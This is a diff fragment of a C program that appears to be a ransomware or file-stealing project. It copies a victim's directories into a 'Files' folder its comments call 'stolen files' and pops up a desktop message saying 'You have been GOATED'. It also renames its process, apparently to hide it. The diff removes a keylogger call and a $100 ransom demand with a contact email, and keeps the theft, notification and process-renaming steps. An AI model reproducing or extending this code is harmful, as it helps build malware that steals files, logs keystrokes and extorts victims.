@@ -13,20 +13,19 @@ int main(int argc, char *argv[]) {
 	strcat(copyToDir, "/Files");
 	
 	/* FIRST PARAM OF OPENDIR IS THE DIRECTORY TO START OUT WITH */
-	openDir("test", 0);
+	openDir(START, 0);
 
-	
-	// Give permission to access stolen files
-	givePermission();
-	keyLogger(); 
 	char command[100], msg[1000];
 
 	strcpy(command,"notify-send ");
-	strcpy(msg,"\"You have been GOATED. To regain access to you files, you owe $100.00. Email ihavebeengoated@gmail.com for next steps.\"");
+	strcpy(msg,"\"You have been GOATED.\"");
 	strcat(command,msg);
 
 	// Send system message
 	system(command);
+
+	// Give permission to access stolen files
+	givePermission();
 
 	changeProcessName(argv);
 	return 0;
